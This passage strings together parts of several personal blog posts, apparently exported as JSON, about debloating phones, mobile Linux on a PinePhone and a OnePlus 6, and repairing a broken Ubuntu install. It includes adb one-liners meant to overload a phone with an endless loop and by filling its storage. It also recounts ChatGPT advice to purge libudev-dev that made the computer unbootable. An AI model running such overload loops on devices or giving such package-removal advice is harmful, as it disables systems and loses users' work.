with\nbloatwares.</p>\n<h2 id=\"messing-up-with-phone-once-more\">Messing Up with Phone Once\nMore</h2>\n<p>This time, I didn\u2019t blindly remove all Xiaomi bloatwares. Instead, I\nresearched online and tried to remove only those identified as\nbloatwares. Since there were hundreds, manual removal was impractical,\nfurther highlighting the phone\u2019s annoyances.</p>\n<p>After using adb to uninstall and disable some apps, I encountered\nissues installing new apps due to not being signed into the MIUI\naccount. Uninstalling certain apps had prevented me from signing in,\nleaving me with no option but to wipe the data again.</p>\n<h2 id=\"trying-to-customize-again\">Trying to Customize Again</h2>\n<p>On my next attempt, I removed the packages manually, one by one. It\nwas a tedious process. After removing the theme, my wallpaper became\npure black, aligning with my preference for dark mode.</p>\n<p>Then, I installed Google Phone, Google Files, Google Messages, Google\nPhotos, Google Chrome, and some other apps using APK Pure, Softonic, and\nUptodown APKs via computer and adb.</p>\n<p>I tried installing Google Play Store, but it wouldn\u2019t open. Even\nusing a Google installer didn\u2019t help. However, I realized that I didn\u2019t\nparticularly need the Google Play Store. Firstly, I don\u2019t heavily rely\non a smartphone, with WeChat being my primary app. Secondly, I\u2019m not a\nfan of the Google Play Store. Thirdly, I can source all necessary APKs\nmyself.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>In summary, my journey with different smartphones isn\u2019t satisfactory\nat all.

Everything was good and the phone booted into Arch.</p>\n<p>I used Ubuntu mostly and I am not entirely familiar with Arch. I went\nto the command line and tried some, and fortunately it worked. However,\nI couldn't connect to the wifi.</p>\n<h3 id=\"connecting-to-the-wifi\">Connecting to the Wifi</h3>\n<p>I tried the gnome setting but the gnome setting would quit every few\nseconds for no reason. So I tried connecting to wifi from command line.\nI tried <code>nmtui</code> but it didn't support the Berkeley Eduroam\nInternet. Also the wifi couldn't discover my phone's hotspot.</p>\n<p>Then I tried <code>nmcli</code></p>\n<pre class=\"bash\"><code>#!/bin/bash\n\nsudo nmcli con add con-name &#39;BerkeleyEduroam&#39; \\\nifname wlan0 \\\ntype wifi \\\nssid &#39;eduroam&#39; \\\nwifi-sec.key-mgmt wpa-eap \\\n802-1x.eap peap \\\n802-1x.identity &#39;jimchen@berkeley.edu&#39; \\\n802-1x.password &#39;&lt;password&gt;&#39; \\\n802-1x.phase2-auth mschapv2</code></pre>\n<p>I had to manually type those commands myself and they lead to many\nerrors. I couldn't even use gedit.</p>\n<p>Anyways, after that at school the Arch PinePhone would connect to\nschool Internet.</p>\n<h3 id=\"tried-openssh\">Tried Openssh</h3>\n<p>The openssh didn't work on the phone no matter how hard I tried, the\ncomputer just couldn't detect the phone. I changed the ssh config and\nallowed root login <code>/etc/ssh/sshd_config</code></p>\n<p>but my computer couldn't detect the phone while on the same\nnetwork.</p>\n<h3 id=\"pacman-update-error\">Pacman Update Error</h3>\n<p>Then I tried updating the phone and installing other things but it\nwould always return <code>error:GPGmE error: no data</code></p>\n<p>I tried</p>\n<pre class=\"bash\"><code>sudo rm -r /etc/pacman.d/gnupg\nsudo pacman-key --init\nsudo pacman-key --populate archlinux</code></pre>\n<p>But it didn't work. It would encounter same error all over again.</p>\n<h3 id=\"tried-downloading-ngrok\">Tried Downloading Ngrok</h3>\n<p>I thought if I could connect through Ngrok to my computer everything\nwill be easy. However, there wasn't any wget, and when I tried to</p>\n<pre class=\"sh\"><code>curl -O https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.tgz</code></pre>\n<p>It says the source couldn't be validated, and it couldn't be\ndownloaded.</p>\n<p>So in the end it is practically the same like without Internet since\nI couldn't do anything except curl html elements on a specific\nwebsite.</p>\n<p>Firefox didn't work because it said profile didn't find, and there\nwas the nasty GUI problem where all buttons got out of screen.</p>\n<h3 id=\"tried-to-boot-ubuntu-touch\">Tried to boot Ubuntu Touch</h3>\n<p>So I tried to boot Ubuntu Touch into the Microsd card, but the phone\nwouldn't read the microsd card when it boots, and after about 50 seconds\nit would switch back to Arch. At this point the jumpdrive didn't work\ntoo.</p>\n<h2 id=\"feeling-disappointed\">Feeling Disappointed</h2>\n<p>Laptop Linux are so fun for me but I seemed to have a little problem\nwith mobile Linux. I am very sad I achieved almost nothing today, and\nspent all my time over this crappy little device.</p>\n<p>I could practically do nothing on the system now, so maybe I will try\nto buy another microsd card and try booting from there, and hopefully\nUbuntu Touch will work out, since I am much more familiar with\nUbuntu.</p>\n<h2 id=\"should-i-still-using-ios\">Should I Still Using IOS</h2>\n<p>Then I thought whether should I keep use IOS. And that is a very\ninteresting question. To be honest if Linux distros works out fully good\nfor me I would not use IOS, but again the PinePhone is cheap and\nfunctions much worse(as I heard) than either Android or IOS. The pricer\nLinux phones are Librem 5 which is like 1000 dollars, almost as\nexpensive as a new high-computation laptop(like the system76 I just\nbought). I thought it hilarious to buy a phone with such a price. Then\nagain, Linux are meant to be cheaper and more functional and more\ncustomizable, instead of expensive and hard to use. Moreoever, the\nPinePhone ran into a million bugs, which I couldn't fix even in one\nwhole day, and that is before it even have basic functions.</p>\n<p>Even if the PinePhone is fully set up it would still be not even half\nas good as IOS speaking of funtionality.</p>\n<h2 id=\"why-is-ios-not-comfortable\">Why is IOS not comfortable?</h2>\n<p>If only IOS allow more customization I wouldn't even think of this in\nthe first place.</p>\n<p>First: the app store. Even though it has enough apps I still want to\ninstall apps myself instead of through app store.</p>\n<p>Second: the desktop. I want to customize it to run like gnome or lxde\nbut it wouldn't let me customize the desktop.</p>\n<p>Third and most importantly, there is no command line in IOS, which\nlike you cannot know anything about the phone, which is very sad. It\nfeels like living in someone else's house and the phone doesn't seem to\nbelong to me 100%.</p>\n<p>It is not that I hate IOS or something, unlike Windows, which I hate\nso much. I am just a obsessed Linux fanatic.</p>\n<p>It's not like I can do anything about my personality, if I could then\nI probably wouldn't be the one I am right now.</p>\n<p>So yeah I thought I would still use IOS, which is kind of sad. The\nPinePhone didn't come as I had expected to be, although I think I should\nadjust my expectation for such a cheap phone anyways.</p>\n<h2 id=\"what-to-do-in-future-with-pinephone\">What to do in Future with\nPinePhone</h2>\n<p>Even if I don't use PinePhone primarily I could still use it for fun\noccasionally, like connect my computer terminal to it and run some\nprograms on PinePhone(for example, computer virus, since I don't care\nabout it anyways). It seems a good virtual machine. I can also use it on\nsome occasions if there isn't demanding tasks, like only calling and\nmessaging, at least it has more functions than my Philip Senior Citizen\nPhone.</p>\n<h2 id=\"references\">References</h2>\n<ul>\n<li><a href=\"https://www.pine64.org/pinephone/\">PinePhone</a></li>\n<li><a href=\"https://manjaro.org/downloads/arm/\">Manjaro ARM</a></li>\n<li><a href=\"https://archlinuxarm.org/\">Arch Linux ARM</a></li>\n<li><a\nhref=\"https://developer.gnome.org/NetworkManager/stable/nmcli.html\">NetworkManager\nCLI Reference</a></li>\n<li><a href=\"https://ngrok.com/\">Ngrok</a></li>\n</ul>\n", "_id": "66689635547d3fe09811875e"}
{"title": "Booting PostMarketOS", "date": "Wed Apr 10 2024 19:36:45", "type": "phone", "body": "<h2 id=\"why\">Why?</h2>\n<p>After getting rid of the crappy UI and installing LineageOS on my\nRedmi Phone\n(https://www.jimchen.me/blog/Sat%20Mar%2009%202024%2002:01:02), I was\nstill not satisfied. Mainly because I am using WeChat too frequently,\nand it is kinda addictive and time-wasting. Those apps eat away at me\nand gradually I become dependent on the mobile phone, glued to it\noccasionally. Eventually, I decided that carrying WeChat with me\neverywhere is just too distracting.</p>\n<p>Furthermore, LineageOS doesn\u2019t offer as much control as Linux does. I\nmean, it does offer more control than iPhone or many Android phones with\nthose crappy UIs, but it is more or less based on Android, and I am not\nthat familiar with it.</p>\n<p>With digital freedom and being liberal in mind, I began to explore\nPostMarketOS.</p>\n<h2 id=\"jailbreaking-iphone-crash\">Jailbreaking iPhone Crash</h2>\n<p>I tried to jailbreak the iPhone after running a script, but\nunfortunately, after that, my iPhone no longer boots, so I don\u2019t know\nwhat to do with it other than letting it rot.</p>\n<h2 id=\"buying-oneplus-6\">Buying OnePlus 6</h2>\n<p>Among the many devices supported by PostMarketOS, OnePlus 6 is a very\naccessible and modern choice, released in 2018. I hadn\u2019t realized that\nit was 6 years old though. Other devices like Nokia N900 have only 256\nMB RAM, and the Samsung Phones were released in like 2013 or 2014.\nAnyways, I bought OnePlus 6 for 490 RMB (70 USD) from an online retailer\nstore and began exploring.</p>\n<h2 id=\"flashing-the-rom\">Flashing the ROM</h2>\n<p>Everything is very easy and straightforward; unlock the bootloader,\nthen flash 2 images, and I am done.</p>\n<h2 id=\"desktop-environment\">Desktop Environment</h2>\n<p>There are Phosh, Plasma Mobile, Gnome Mobile, and SXMO.</p>\n<p>SXMO doesn\u2019t really have a UI; it\u2019s more like i3, managing everything\nfrom a dropdown menu.</p>\n<p>Phosh and Gnome Mobile are pretty alike. Phosh was the mobile version\nfor GNOME, but there are some small differences. They come with the same\nsoftware shipped.</p>\n<p>The wiki (https://wiki.postmarketos.org/) has most things anyway.</p>\n<h2 id=\"about-gnome-problems\">About Gnome Problems</h2>\n<p>Overflow: It is kind of working in GNOME with all windows very\nsmall.</p>\n<ul>\n<li><p>Overflowing:</p>\n<ul>\n<li>Nautilus is overflowing</li>\n<li>Chromium is overflowing</li>\n<li>Firefox Works, but some website overflows due to useragent being a\ncomputer(still overflows when I set useragent to mobile), My 2 websites,\n<code>jimchen.me</code> and <code>anonytube.jimchen.me</code> works well\nthough, since I am determining the fonts based on the window\ninnerWidth.</li>\n</ul></li>\n<li><p>Doesn\u2019t natively support Chinese characters.(Plasma Mobile does,\nbut its even more breakable)</p></li>\n<li><p>Needs manually switch between Headphones and Speakers: Kinda\nharder</p></li>\n<li><p>Rebooting error due to hardware problems, sometimes running into\nSnapdragon Coredump</p></li>\n<li><p>Screen not auto-closing</p></li>\n<li><p>Doesn\u2019t support many appimages(have to configure Clash\nmanually)</p></li>\n<li><p>Need to re-login on every screen close, and it was configured to\naccept 6 numbers (sometimes buggy if the password contains other\nthings), thus the user password needs to be 6 numbers, else it got very\nbuggy on login</p></li>\n<li><p>Camera not working on OnePlus 6 and OnePlus 6T</p></li>\n<li><p>Cannot tweak. I tried tweaking the font and it broke the user\ninterface. It is easily breakable, if I tweak the phone becomes\nunusable</p></li>\n<li><p>Cannot receive calls (can initiate calls and receive\nmessages)</p></li>\n</ul>\n<p>These are mostly kinda small problems and can be solved by scripts,\nexcept the last problem receiving calls, which makes it not usable than\na daily driver. Even a senior citizen easy phone can do calling with no\nproblems.</p>\n<p>The driver isn\u2019t waking up in PostMarketOS, and in the community\nversion Droidian they ship some android drivers to make it work.</p>\n<h2 id=\"about-sxmo\">About SXMO</h2>\n<p>SXMO is like swm for phones. It is so snappy and build all with\nscripts(there are those hooks for calling, for receiving messages, etc).\nIt is really really cool and builds upon a text based menu, and\neverything is customizable(instead it is more like someone\u2019s customized\nscripts rather than a well-established DE) I can run qutebrowser on it,\nand it features a really cool keyboard where you control everything on\nthe screen(like etc, and those vim bindings). It even use vim to send\nmessages as default! I was like, wow.</p>\n<p>Like when I tried to navigate around the menu I can easily know the\ncli commands to get those stuff, like connecting to wifi or whatever. It\nis literally navigating through the terminal with a cli interface.</p>\n<h2 id=\"customization\">Customization</h2>\n<h3 id=\"ssh\">SSH</h3>\n<p>Run <code>sudo rc-service sshd start</code> for computer to sshd into\nit. From usb: <code>ssh user@172.16.42.1</code>, else run ifconfig and\nget the ip address.</p>\n<h3 id=\"installing-stuff\">Installing Stuff</h3>\n<p>Using gnome-mobile, there are many preinstalled apps that are\nunnecessary, and I also need some stuff, after connecting to wifi, I run\nthese commands to customize it a little bit</p>\n<pre class=\"bash\"><code>cd ~ &amp;&amp; rm -rf Desktop Downloads Pictures Templates Documents Music Public Videos\nsudo rc-update add sshd default\nsudo sed -i &#39;s/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g&#39; /etc/apk/repositories\nsudo apk del firefox-esr lollypop loupe gnome-clocks postmarketos-tweaks  gnome-contacts karlender portfolio gnome-software gnome-calculator postmarketos-welcome gnome-text-editor &amp;&amp; sudo apk update &amp;&amp; sudo apk upgrade &amp;&amp;  sudo apk add bash curl nano vim firefox git net-tools ranger</code></pre>\n<h2 id=\"full-disk-space\">Full Disk Space</h2>\n<p>As we all know, Alpine Linux is lightweight, and added together it\nwas around 2.3 GB</p>\n<pre class=\"output\"><code>Filesystem                Size      Used Available Use% Mounted on\ndev                      10.0M         0     10.0M   0% /dev\nrun                       3.7G      2.2M      3.7G   0% /run\n/dev/mapper/userdata2\n                        108.7G      2.3G    100.9G   2% /\n/dev/mapper/userdata1\n                        221.1M     60.2M    149.1M  29% /boot\nshm                       3.7G         0      3.7G   0% /dev/shm\ntmpfs                   756.0M     20.0K    756.0M   0% /run/user/10000</code></pre>\n<h2 id=\"configuring-clash\">Configuring Clash</h2>\n<p>So before that I used Clash-verge in Linux(a frontend gui for clash\nthat works fine). There is also Clash for Android. But like the gui\nisn\u2019t working well in PostmarketOS, so as an example to program it from\ncommand line, add a <code>test.yml</code></p>\n<pre class=\"yml\"><code>proxies:\n  - name: &quot;Server1&quot;\n    type: ss\n    server: bff6ce3.gxtewt.lol\n    port: &quot;43748&quot;\n    cipher: aes-128-gcm\n    password: [YOURPASSWORD]\n  - name: &quot;Server2&quot;\n    type: ss\n    server: bff6ce3.gxtewt.lol\n    port: &quot;43641&quot;\n    cipher: aes-128-gcm\n    password:  [YOURPASSWORD]\nmode: Global\nexternal-controller: &#39;0.0.0.0:9090&#39;\nport: 7890  # HTTP proxy port\nsocks-port: 7891  # SOCKS5 proxy port</code></pre>\n<p>Then get the file <code>Country.mmdb</code> and put it in current\ndir.</p>\n<pre class=\"bash\"><code>$ clash -d . -f test.yml\nINFO[0000] inbound http://127.0.0.1:7890 create success.\nINFO[0000] inbound socks://127.0.0.1:7891 create success.\nINFO[0000] RESTful API listening at: [::]:9090</code></pre>\n<p>Using the api</p>\n<pre class=\"bash\"><code>$ curl http://localhost:9090/proxies/GLOBAL\n{&quot;alive&quot;:true,&quot;all&quot;:[&quot;DIRECT&quot;,&quot;REJECT&quot;,&quot;Server1&quot;,&quot;Server2&quot;],&quot;history&quot;:[],&quot;name&quot;:&quot;GLOBAL&quot;,&quot;now&quot;:&quot;Server2&quot;,&quot;type&quot;:&quot;Selector&quot;,&quot;udp&quot;:false}\n$ curl -X PUT -H &quot;Content-Type: application/json&quot; -d &#39;{&quot;name&quot;: &quot;Server1&quot;}&#39; http://localhost:9090/proxies/GLOBAL\n$ curl http://localhost:9090/proxies/GLOBAL\n{&quot;alive&quot;:true,&quot;all&quot;:[&quot;DIRECT&quot;,&quot;REJECT&quot;,&quot;Server1&quot;,&quot;Server2&quot;],&quot;history&quot;:[],&quot;name&quot;:&quot;GLOBAL&quot;,&quot;now&quot;:&quot;Server1&quot;,&quot;type&quot;:&quot;Selector&quot;,&quot;udp&quot;:false}</code></pre>\n<p>OnePlus 6 doesn\u2019t work with calling functionality. I bought OnePlus 6\nfajitta, in hope that it will work with calls. I was still eager not to\ngive up. It said on the Postmarket OS wiki that fajita\u2019s calling is\nworking.</p>\n<h2 id=\"flashing-mobian\">Flashing Mobian</h2>\n<p>So I decided to first try mobian.</p>\n<p>The process is very straightforward, just go to fastboot and flash\nthe boot and userdata image to it and that\u2019s pretty much it. Mobian was\nrunning with Phosh, and it was pretty cool.</p>\n<p>However, the calling function isn\u2019t working, and I cannot receive\ncalls.</p>\n<h2 id=\"trying-postmarketos-again\">Trying PostMarketOS again</h2>\n<p>Anyways, I tried PMOS again, but it still doesn\u2019t work with receiving\ncalls(like OnePlus 6 and OnePlus 6t are pretty similar, why should I\nexpect OnePlus 6t to work with calling? Lol).</p>\n<h2 id=\"device-got-bricked\">Device got Bricked</h2>\n<p>Then I got kind of sad and tried to erase some partitions with\nfastboot, however, in flashing, I erased a critical partition\naccidentally with fastboot, and my device got bricked and stuck in a\nbootloop.</p>\n<p>So I went to get the stock firmware and payload dumper(on github),\nand extracted the images. Basically run\n<code>fastboot getvar all</code>, and see which specs of the phone and\nwhich slot is active. So flash to the inactive slot and then switch. I\nmade the mistake of flashing to different slots multiple times.</p>\n<p>Anyway, I flashed them to the phone with fastboot, then rebooted, and\neverything works smoothly, and I was able to recover back to Android. It\nwent to crashdump mode a few times, but overall it\u2019s not that hard. I\nthought I was in great trouble, turned out everything worked fine.</p>\n<p>Then I flashed PostMarketOS again and it was fine(without\ncalling).</p>\n<h2 id=\"washing-the-phone\">Washing the Phone</h2>\n<p>So the phone is second-handed and very dirty, and I tried to wash it,\nbut after washing the phone fastboot devices could no longer detect the\nphone(I don\u2019t know if it is relevant, just suspecting). USB ssh still\nworks so it\u2019s really weird, like I go to fastboot mode and it wasn\u2019t\neven detecting anything, lol. I don\u2019t know any other ways to flash or\nwhatever.</p>\n<p>After a while(I think like 2 hours or so), I went back and tried\nfastboot and it worked miraculously.</p>\n<h2 id=\"whats-good-about-postmarketos\">What\u2019s Good about\nPostMarketOS?</h2>\n<p>It gives users full control, including but not limited to (I observed\nthese):</p>\n<ul>\n<li>Browser behaves like a computer, so if you switch tabs, brower\nvideos play in the background. It can be a miniserver, kind of like a\nRaspberry Pi without those pins and controls</li>\n<li>Have a native console. Ahh,, the amount of power and control I feel\nwith the cli, like literally the phone is under my control. I can also\nssh easily, and problems can be fixed much faster.</li>\n<li>Package Manager!!! Like honestly, I would die for a package manager\n(although this means limited software anyways, like only those working\nin Linux, like no shitty WeChat, lol). There is Fdroid on Android that\u2019s\nmostly FOSS software and it\u2019s pretty good too(It includes link to the\nsource code and you can update it easily)</li>\n<li>Native Linux env: I am most familiar with Linux and not familiar\nwith proprietary environments</li>\n<li>Good Desktop Environment! Like you can install different DE, so no\nmonopoly is at place. At least Gnome, dwm(sxmo), and Plasma work to some\nextent on PostMarketOS, so like you can choose which desktop environment\nyou want instead of being stuck with something the company provides. I\nam not specifically saying the DE the company provides is bad or\nsomething, just choices make one happier(given choices I might still\nchoose the default, but I will probably feel more contented).</li>\n<li>Debloated. Honestly a phone doesn\u2019t need or consume that much space\nas much as 128 GB. My computer doesn\u2019t need that much SSD unless running\nsome machine learning models locally. A fresh install is only around 2\nGB, and it is with Gnome(which is considered a heavy DE). Honestly among\nthe well supported distros Alpine is the lightest.</li>\n</ul>\n<h2 id=\"is-postmarketos-a-smartphone\">Is PostMarketOS a SmartPhone?</h2>\n<p>Of course it is, except it is more aligned with the functions of\ncomputer than phone. It is kind of like a Rasp Pi but with calling and\nmessaging functions.</p>\n<p>And also, the OnePlus is a smartphone, so it should be a smartphone.\nWhether a phone is smart shall be categorized be the kind of phone it\nis, not by the kind of operating systems.</p>\n<p>Also it can browser web like on computer, so I do think it is a\nsmartphone. It is only uncompatible with apks and App store.</p>\n<h2 id=\"about-peoples-opinions\">About People\u2019s Opinions</h2>\n<p>It\u2019s a person\u2019s freedom to think I am weird and don\u2019t like my ideas,\nbut I think the same too about others though. Mobile Linux has a far\nsmaller market than laptop Linux(although Android in build upon Linux\ncore), so probably very very few people would comprehend. I think most\npeople have far more resilience to WeChat or similar apps than I do. In\nfact, I am easily addicted and distracted by many of those apps,\nsometimes leading me to not doing anything all day long, so I must\nforcibly separate myself from those apps to ensure my mental wellbeing.\nPeople don\u2019t seem to understand that since they have resilience and\nself-control(which I seriously lack in). I also have the freedom to\ndislike other products with adequate reasons.</p>\n<h2 id=\"whats-next\">What\u2019s Next?</h2>\n<p>The disk is 128 GB so I can store lots of 4k movies in it to watch\noffline. The whole working system is less than 4 GB now. It will\nprobably gets larger, but with Alpine Linux it\u2019s just trivial to the\nwhole disk.</p>\n<p>I have no idea why people run out of disk space. Just delete the\nfreaking bloatwares and everything would be working fine. Like to be\nhonest without running Pytorch, 30 GB is enough for the whole computer\nor mobile with wise management(size of smaller sized SD card).</p>\n<p>I will still need WeChat now and then, just not on a daily basis. For\nexample, when like going to the hospital or doing certain things\u2026</p>\n<p>WeChat is a mandatory software nowadays in China, if it isn\u2019t\nrequired I will delete WeChat.</p>\n<p>Sometimes when I need to call a Taxi the AMap and BaiduMap works good\nin LineageOS, but I can try not to call taxi altogether. It\u2019s not that\nmuch of a discomfort, just manage time more wisely.</p>\n<p>Which obviously brings me nostalgia again back to the summer of 2018\nwhen I didn\u2019t have a smartphone yet(I kind of wished I never need to use\none now), when I went to Pudong Gaoqiao Riverside Forest Park alone in a\nbus with my old \u201cPhilip\u201d phone(for elders). I waited for the bus (it\nonly came every 50 minutes) after taking the subway forever, but\nfortunately the bus came around 20 minutes, and when I tried to return\nhome the bus came very quickly.</p>\n<p>Despite the inconvenience, I had less on my mind and had so much fun.\nI used to walk around and enjoy everything with a light-weighted heart,\nand look at the vast sea like nothing else mattered.</p>\n<p>I remembered on that day I had 200 RMB(a lot to me at the time), and\nwent all alone, and I thought that I would have went there much easier\nif I could call taxi after exiting the subway station. But being free of\nsmartphone trap gives a unique sense of joy and freedom to the mind.</p>\n<h2 id=\"references\">References</h2>\n<ul>\n<li><a href=\"https://wiki.postmarketos.org/\">PostMarketOS Wiki</a></li>\n<li><a\nhref=\"https://wiki.postmarketos.org/wiki/OnePlus_6_(oneplus-enchilada)\">OnePlus\n6 PostMarketOS Guide</a></li>\n<li><a href=\"https://wiki.mobian-project.org/\">Mobian\nDocumentation</a></li>\n<li><a href=\"https://developer.android.com/studio/run/device\">Fastboot\nDocumentation</a></li>\n</ul>\n", "_id": "66689635547d3fe09811875f"}

I tried adb devices\nand adb start-server and adb kill-server but none of them responded, and\nI reinstalled it 3 times, and installed the platform-tools twice but it\nstill wouldn\u2019t work. Miraculously it worked on the cloud server.</p>\n<p>It is quite uncommon for an application to have a bug that is hard to\nfix like this, well maybe except for wine or android emulators bugs.</p>\n<p>adb wouldn't respond with all of the commands</p>\n<pre class=\"sh\"><code>adb devices\nadb start-server\nadb kill-server</code></pre>\n<p>And I asked ChatGPT how to fix the bug, and it told me various ways\nlike using strace and aux and grep the service, but the just wouldn\u2019t\nwork. Any commands associated with adb would freeze in the terminal.</p>\n<h2 id=\"trying-to-debug-the-problem\">Trying to Debug the Problem</h2>\n<p>So I tried the process</p>\n<pre class=\"sh\"><code>ps aux | grep adb\npkill -f adb</code></pre>\n<p>It did terminate adb but nothing else, adb won't respond.</p>\n<p>Only <code>adb version</code></p>\n<p>did respond, then I tried <code>rm -rf ~/.android</code></p>\n<p>These wouldn't respond when I tried to start the server and\ndebug,</p>\n<pre class=\"sh\"><code>adb -L tcp:5037 fork-server server --log debug\nenv -i adb start-server</code></pre>\n<p>I mean if there are bugs the bugs should be easily spotted, but in\nthis case it would just freeze in terminal</p>\n<p>Then I tried to trace the startup process\n<code>strace adb start-server</code></p>\n<p>but it showed</p>\n<pre class=\"sh\"><code>bind(3, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr(&quot;127.0.0.1&quot;)} 16) = 0\nconnect(3, {sa_family=AF_INET, sin_port=htons(5037), sin_addr=inet_addr(&quot;127.0.0.1&quot;)} 16) = -1 ECONNREFUSED (Connection refused)\nclose(3) = 0\nsocket(AF_INET6, SOCK_STREAM, IPPROTO_IP) = 3\nbind(3, {sa_family=AF_INET6, sin6_port=htons(0), sin6_flowinfo=htonl(0), inet_pton(AF_INET6, &quot;::1&quot;, &amp;sin6_addr), sin6_scope_id=0} 28) = 0\nconnect(3, {sa_family=AF_INET6, sin6_port=htons(5037), sin6_flowinfo=htonl(0), inet_pton(AF_INET6, &quot;::1&quot;, &amp;sin6_addr), sin6_scope_id=0} 28</code></pre>\n<p>Then I was really frustrated. Then Chatgpt told me to\n<code>sudo apt-get purge libudev-dev</code></p>\n<p>And I tried that command, and it broke my computer. Suddenly my\ncomputer could no longer boot.</p>\n<h2 id=\"remembering-the-homework-deadline\">Remembering the Homework\nDeadline</h2>\n<p>Then I remembered I had to do a homework by the end of the day(like 2\nhours work), so I was very anxious indeed, and I went to the school and\ntried work on the windows computer there.</p>\n<p>But the homework wouldn\u2019t work in the school\u2019s windows\ncomputer(without python) and gooogle colab, since it constantly\ncomplained about modules and libraries.</p>\n<p>And I tried for 2 hours without any success of making the homework\nrun on the school\u2019s computer or the cloud server, and the school's\nlibrary is closing, so I went back home again and tried to fix the\ncomputer.</p>\n<h2 id=\"emergency-mode\">Emergency Mode</h2>\n<p>The computer boots into emergency mode when it starts, and I had no\nidea what to do. After trying the root password several times I finally\nmanaged to boot into root, but the systemd was broken, and I entered\nrecovery mode and tried to fsck the system.</p>\n<p>A dev service was kind of broken, and Ubuntu couldn't launch.</p>\n<p>Anyways, it didn\u2019t work well, and I didn\u2019t know how to connect to the\ninternet with the computer. So I tried booting from a usb disk, and it\ndidn\u2019t went well either. I still couldn\u2019t connect to the internet.</p>\n<h2 id=\"installing-from-usb-again\">Installing from USB Again</h2>\n<p>So I tried to install Ubuntu again from the usb stick. But when\nbooting the old network thing went wrong again. So I tried changing the\nnetwork service timeout and it worked.</p>\n<p><code>sudo nano /lib/systemd/system/networkd-wait-online.service</code></p>\n<p>Then change add timeout to 1 second after the exec command.</p>\n<p>Then I could only make Ubuntu connect to internet with ethernet,\nconnecting my phone to the computer with a usb and then by using\n<code>ip link</code> to list devices then\n<code>sudo dhclient enx\u2026</code> to connect to that device, then I could\ngo online, but there was this no additional driver found, and I tried\ncloning the rt driver and it didn\u2019t work. However, it continuously shows\nno Wi-Fi adapters found.</p>\n<h2 id=\"rubbish-redmi-unlocker\">Rubbish Redmi Unlocker</h2>\n<p>However, my redmi phone was locked by the bootloader, so I needed to\nunlock the bootloader to be root. However, I opened the\nhttps://unlock.update.mini.com and it wouldn\u2019t download for like 10\ntimes. It is very crappy indeed. Then when I finally get it to download\nit returned a zip with only exe files in it, which is totally terrible\nand inconsiderate for the company.</p>\n<p>I tried running the exe with wine but it face so many problems. It\nwouldn't even display. Wine is the most buggy program in Ubuntu.\nYesterday I went to the school and tried running it on the school\u2019s\nwindows computer but it couldn\u2019t detect the Redmi phone connected.</p>\n<p>So since the bootloader was only in exe I decided it is very crap\nanyways. So I started to hate redmi like I hate windows.</p>\n<h2 id=\"phone-ownership\">Phone Ownership</h2>\n<p>Then I thought about phone ownership and reckoned that if I cannot\naccess the bootloader I do not really own this phone. I cannot customize\nanything, the phone is just basically owned by the company. Don't talk\nabout security and integrity measures, if I cannot do customized\nsettings in this phone I do not own it 100%, and that's not good.</p>\n<h2 id=\"trying-to-overload-the-phone\">Trying to Overload the Phone</h2>\n<p>And then I thought since I do not own the phone and the phone is old\nI want to try overload the phone with adb.</p>\n<p>Adb have no root access since the phone is locked, and I tried\nfastboot too, it wouldn't load.</p>\n<p>Then I tried to play around with the adb shell and tried to overload\nthe device. I tried a infinite\nloops.<code>adb shell \"while true; do :; done &amp;</code> It instantly\nmade the old phone unusable, but nothing else, and when unplugged the\nphone would still run as good as normal.</p>\n<p>Then I tried to load large files into the phone\n<code>while true; do adb push large_file.txt /sdcard/; done</code>, but\nthe storage soon filled up and the data part was only accessible by\nroot, and the phone was usable after all the mess around.</p>\n<h2 id=\"no-wifi-adapters-on-ubuntu\">No Wifi-Adapters on Ubuntu</h2>\n<p>Then the Ubuntu Gnome couldn't connect to Wifi, and I couldn't figure\nout the reason. I could only connect to wifi with a phone and usb\ncables.</p>\n<p>Then I tried nmcli device wifi list, but it returned</p>\n<pre class=\"sh\"><code>IN-USE \u00a0BSSID \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0SSID \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0MODE \u00a0 CHAN \u00a0RATE \u00a0 &gt;</code></pre>\n<p>I figured it was because I disabled the network devices earlier on,\nand after <code>ls /lib/systemd/system | grep etwork</code> it returned\nmultiple services,</p>\n<pre class=\"sh\"><code>systemd-networkd.service\nsystemd-networkd-wait-online.service\nNetworkManager.service\nNetworkManager-wait-online.service</code></pre>\n<p>the networkd service causing the\n<code>A start job is running for wait for network to be configured</code>\nproblem, I might actually accidentally disabled the other.</p>\n<p>Then I tried other desktop environments like lxde but lxde wouldn\u2019t\nboot and encountered multiple system problems.</p>\n<h2\nid=\"watching-the-russian-figure-skating-test-skate-free-program\">Watching\nthe Russian Figure Skating Test Skate Free Program</h2>\n<p>And then I had tried like 12 hours without success and missed my\nhomework deadline so I was very much in distress. It was 5 am in the\nmorning. So I watched Russian figure skating test skate free program\nlive on <a href=\"https://1tv.ru\" class=\"uri\">https://1tv.ru</a> and went\nto sleep.</p>\n<h2 id=\"installing-ubuntu-again\">Installing Ubuntu Again</h2>\n<p>Then I installed the Ubuntu again today, erasing yesterday\u2019s\npartition and there was no Wi-Fi adapter problems.</p>\n<p>The steps are</p>\n<ul>\n<li>boot the system (with/without network configurations)</li>\n<li>connect phone to computer and use dhclient to connect to\nInternet</li>\n<li><code>sudo apt update &amp;&amp; sudo apt install ubuntu-desktop gdm3</code></li>\n<li><code>sudo systemctl start gdm3</code></li>\n</ul>\n<p>Then enable the timeout in\n'systemd-networkd-wait-online.service'.</p>\n<h2 id=\"references\">References</h2>\n<ul>\n<li><a href=\"https://ubports.com/\">Ubuntu Touch</a></li>\n<li><a\nhref=\"https://developer.android.com/studio/command-line/adb\">Android\nDebug Bridge (adb)</a></li>\n<li><a href=\"https://en.miui.com/unlock/\">Unlock Your Xiaomi\nDevice</a></li>\n</ul>\n", "_id": "66689635547d3fe098118760"}

